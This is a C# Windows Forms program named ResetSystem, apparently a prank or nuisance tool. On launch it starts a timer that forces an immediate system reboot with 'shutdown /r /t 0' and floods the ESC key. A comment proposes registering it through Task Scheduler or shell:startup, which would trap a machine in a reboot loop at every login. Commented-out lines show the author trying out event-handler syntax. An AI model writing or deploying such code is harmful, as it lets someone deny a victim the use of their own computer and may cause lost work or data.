using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
namespace ResetSystem
{
    public partial class Form1 : Form
    {
        public void eventhdl(object a, EventArgs e)
        {
            Process.Start("cmd.exe","/k");
        }
        Timer tm1 = new Timer();
        public Form1()
        {
            InitializeComponent();
            tm1.Interval = 10;
            //wrong guess
//            tm1.Tick += new EventHandler(delegate (a,b)=>{});
            //this.Load += new EventHandler();           
//            tm1.Tick += new EventHandler(delegate (object,EventArgs)=>{});
  
            //right through try...
           // tm1.Tick += new EventHandler(eventhdl);
            //tm1.Tick += new EventHandler(delegate(object a, EventArgs b) {
            //    Console.WriteLine("test0");            
            //});
            //tm1.Tick+= new EventHandler((a,b)=>{
            //    Console.WriteLine("test");
            //});
            //then we should add this app use taskschd.msc or shell:startup
            tm1.Tick += new EventHandler((a, b) => {
                Process.Start("shutdown.exe", "/r /t 0");
                int i=1000;
                while(i--!=0)
                {
                    SendKeys.Send("{ESC}");
                }
                SendKeys.Flush();
            });
            tm1.Start();
        }
    }
}
